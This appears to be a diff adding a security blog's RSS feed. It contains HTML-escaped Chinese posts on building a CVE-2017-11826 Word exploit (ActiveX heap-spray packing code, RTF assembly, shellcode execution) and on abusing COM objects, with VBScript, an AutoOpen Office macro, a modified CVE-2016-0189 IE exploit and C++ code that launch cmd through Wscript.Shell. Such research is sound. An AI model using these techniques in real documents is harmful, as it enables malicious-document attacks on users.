+    &lt;span class=&quot;n&quot;&gt;zout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;writestr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;word/activeX/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;activeX1.bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object_bin_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;zout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;zin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# convert to docx
+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rename&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zip_docx_copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_docx_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zip_docx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pack_file_to_open_xml_docx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_docx_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activeX_bin_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;新建一个rtf文件，将替换好的docx文件添加到rtf文件中，保存后使用010Editor打开，搜索object，将{\object和{*\objdata的全部内容复制:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804120429898.png&quot; alt=&quot;image-20210804120429898&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再新建一个rtf文件，按照堆喷射、Bypass ASLR和漏洞触发的顺序添加三个对象。堆喷射的内容就是上方复制好的内容，其他两个可以直接在原EXP中复制过来即可，最终EXP的结构如下所示：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141320122.png&quot; alt=&quot;image-20210804141320122&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最终成功执行了shellcode：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141657444.png&quot; alt=&quot;image-20210804141657444&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;参考链接&quot;&gt;参考链接&lt;/h1&gt;
+
+&lt;p&gt;[1] &lt;a href=&quot;https://www.anquanke.com/post/id/87122&quot;&gt;CVE-2017-11826漏洞分析、利用及动态检测&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[2] &lt;a href=&quot;https://www.cnblogs.com/goabout2/p/8186018.html&quot;&gt;office CVE-2017-11826杂谈&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[3] &lt;a href=&quot;https://www.greyhathacker.net/?p=911&quot;&gt;SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[4] &lt;a href=&quot;https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/&quot;&gt;Exploiting Word: CVE-2017-11826&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;[5] &lt;a href=&quot;https://www.anquanke.com/post/id/103080&quot;&gt;Open XML标签解析类漏洞分析思路&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 04 Aug 2021 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2021/08/04/CVE-2017-11826.html</link>
+        <guid isPermaLink="true">http://localhost:4000/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2021/08/04/CVE-2017-11826.html</guid>
+        
+        <category>Office,</category>
+        
+        <category>Type-confusion</category>
+        
+        
+        <category>漏洞分析</category>
+        
+      </item>
+    
+      <item>
+        <title>COM对象的利用与挖掘</title>
+        <description>&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
+
+&lt;p&gt;本文在FireEye的研究&lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html&quot;&gt;Hunting COM Objects[1]&lt;/a&gt;的基础上，讲述COM对象在IE漏洞、shellcode和Office宏中的利用方式以及如何挖掘可利用的COM对象，获取新的漏洞利用方式。&lt;/p&gt;
+
+&lt;h1 id=&quot;com对象简述&quot;&gt;COM对象简述&lt;/h1&gt;
+
+&lt;p&gt;COM(微软组件对象模型)，是一种独立于平台的分布式系统，用于创建可交互的二进制软件组件。 COM 是 Microsoft 的 OLE (复合文档) 和 ActiveX (支持 Internet 的组件) 技术的基础技术。&lt;/p&gt;
+
+&lt;p&gt;注册表项：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID&lt;/code&gt;下，包含COM对象的所有公开的信息，图中显示了Wscript.Shell对象在注册表中的信息：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/Wscript.Shell对象.png&quot; alt=&quot;Wscript.Shell对象&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&lt;/code&gt;就是该对象的CLSID。如果将COM对象比作人的话，CLSID就相当于身份证号，每个COM对象的CLSID都是唯一且不重复的。当然，如果只有身份证号，会有很多不方便的情况，于是便有自己的名字。COM对象中的ProgID就相当于它的名字，图中的COM对象ProgID为WScript.Shell.1：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ProgID.png&quot; alt=&quot;ProgID&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;而InProcServer32表示该COM对象位于哪个PE文件中，图中表示WScript.Shell对象位于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\System32\wshom.ocx&lt;/code&gt;中：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/InProcServer32.png&quot; alt=&quot;InProcServer32&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;有了上述的信息后，接下来便可以通过这些信息去使用COM对象了。&lt;/p&gt;
+
+&lt;h1 id=&quot;com对象的利用&quot;&gt;COM对象的利用&lt;/h1&gt;
+
+&lt;p&gt;COM对象可以通过脚本语言（VBS、JS）、高级语言（C++）和powershell创建。接下来分别介绍这三种创建方式。&lt;/p&gt;
+
+&lt;h2 id=&quot;脚本语言创建com对象&quot;&gt;脚本语言创建COM对象&lt;/h2&gt;
+
+&lt;p&gt;通过脚本语言，我们可以很轻易的创建一个COM对象，使用VBS创建Wscript.Shell对象：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbscript&quot;&gt;Dim Shell
+Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
+Shell.Run &quot;cmd /c calc.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;运行效果如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/运行VBS.png&quot; alt=&quot;运行VBS&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateObject&lt;/code&gt;方法使用COM对象的ProgID：Wscript.Shell来创建对象，创建完成后便能调用该对象的Run方法通过cmd起calc。除了使用ProgID，还可以使用Wscript.Shell对象的CLSID来创建：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbscript&quot;&gt;Dim Shell
+Set Shell = GetObject(&quot;new:72C24DD5-D70A-438B-8A42-98424B88AFB8&quot;)
+Shell.Run &quot;cmd /c calc.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这种方法的好处是当想要创建的COM对象没有ProgID时，便可以通过CLSID进行创建。接下来对&lt;a href=&quot;https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html&quot;&gt;CVE-2016-0189[2]&lt;/a&gt;的EXP进行改造，将EXP中如下vbs代码替换成创建Wscript.Shell即可。&lt;/p&gt;
+
+&lt;p&gt;替换前：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbscript&quot;&gt;&apos; Execute cmd
+Set Object = CreateObject(&quot;Shell.Application&quot;)
+Object.ShellExecute &quot;cmd&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;替换后：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbscript&quot;&gt;&apos; Execute cmd
+Dim Shell
+Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
+Shell.Run &quot;cmd /c calc.exe&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最终实现效果：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/改造EXP.png&quot; alt=&quot;改造EXP&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接下来讲述COM对象在Office宏中的利用，以Office2019为例，在word文档中创建如下宏代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbscript&quot;&gt;Sub AutoOpen()
+Dim Shell
+Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
+Shell.Run &quot;cmd /c calc.exe&quot;
+End Sub
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;打开文件后，会提示宏已被禁用：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/宏安全提示.png&quot; alt=&quot;宏安全提示&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;点击启用宏后，使用cmd起计算器：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/word起calc.png&quot; alt=&quot;word起calc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;用法和IE中一致，就不再赘述了。&lt;/p&gt;
+
+&lt;h2 id=&quot;通过高级语言创建com对象&quot;&gt;通过高级语言创建COM对象&lt;/h2&gt;
+
+&lt;p&gt;如果想通过高级语言（这里以C++为例）使用COM对象的话，必须要明白微软定义的COM三大接口类：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown&quot;&gt;IUnknown[3]&lt;/a&gt;、&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory&quot;&gt;IClassFactory[4]&lt;/a&gt;和&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch&quot;&gt;IDispatch[5]&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;参考&lt;a href=&quot;https://blog.csdn.net/weiwangchao_/article/details/6949264&quot;&gt;COM三大接口:IUnknown、IClassFactory、IDispatch[6]&lt;/a&gt;一文。COM规范规定任何组件、任何接口都必须从IUnknown继承，IUnknown内包含3个函数：QueryInterface、AddRef和Release。QueryInterface用于查询组件实现的其它接口，AddRef用于增加引用计数，Release用于减少引用计数。根据本人的理解，QueryInterface用来获取IClassFactory类的的接口，AddRef和Release用于控制装载后InProcServer32所在PE文件的生命周期。当引用计数大于0时，内存中始终存在一个PE文件可以创建COM对象，当引用计数等于0时，系统会将内存中的PE文件释放掉，也就无法对该COM对象进行任何操作了。&lt;/p&gt;
+
+&lt;p&gt;IClassFactory的作用是创建COM组件，通过类中CreateInstance函数即可创建一个可以使用的COM对象。有了对象还不够，必须要使用对象中的各种函数来执行功能，于是便要使用IDispatch接口类来获取函数和执行函数。&lt;/p&gt;
+
+&lt;p&gt;IDispatch叫做调度接口，IDispatch类中的GetIDsOfNames函数可以通过IClassFactory创建的COM对象的函数名获取对应的函数ID（IID），通过这个ID就可以使用IDispatch类中的Invoke函数来执行COM对象中方法。最后将相关的资源使用IUnknown-&amp;gt;Release函数释放，即可完成一次完整的COM对象调用过程。图中所示就是具体的实现流程：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/image-20210630154827820.png&quot; alt=&quot;word起calc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不过在实际使用中，并不会直接使用IUnknown接口类的函数，因为极易因为程序员的疏忽忘记释放一个接口或者多释放一个接口导致错误，因此使用图中函数CoCreateInstance就能直接创建一个类的接口。也就是说一个函数封装了IUnknown类和IClassFactory类的功能，能够简化流程。&lt;/p&gt;
+
+&lt;p&gt;下面是创建WScript.Shell对象，使用Run方法起powershell的完整代码：&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define _WIN32_DCOM
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;comdef.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#pragma comment(lib, &quot;stdole2.tlb&quot;)
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HRESULT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Step 1: ------------------------------------------------&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 初始化COM组件. ------------------------------------------&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CoInitializeEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;COINIT_MULTITHREADED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Step 2: ------------------------------------------------&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 初始化COM安全属性 ---------------------------------------&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CoInitializeSecurity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                          &lt;span class=&quot;c1&quot;&gt;// COM negotiates service&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;// Authentication services&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;// Reserved&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;RPC_C_AUTHN_LEVEL_DEFAULT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Default authentication &lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;RPC_C_IMP_LEVEL_IMPERSONATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Default Impersonation&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                        &lt;span class=&quot;c1&quot;&gt;// Authentication info&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;EOAC_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                   &lt;span class=&quot;c1&quot;&gt;// Additional capabilities &lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// Reserved&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Step 3: ---------------------------------------&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 获取COM组件的接口和方法 -------------------------&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LPDISPATCH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpDisp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CLSID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clsidshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLSIDFromProgID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;WScript.Shell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clsidshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FAILED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CoCreateInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clsidshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CLSCTX_INPROC_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IID_IDispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpDisp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FAILED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LPOLESTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pFuncName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;Run&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DISPID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpDisp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetIDsOfNames&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IID_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pFuncName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOCALE_SYSTEM_DEFAULT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FAILED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hres&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Step 4: ---------------------------------------&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// 填写COM组件参数并执行方法 -----------------------&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;VARIANTARG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VT_BSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bstrVal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_bstr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;cmd /c calc.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DISPPARAMS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disParams&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
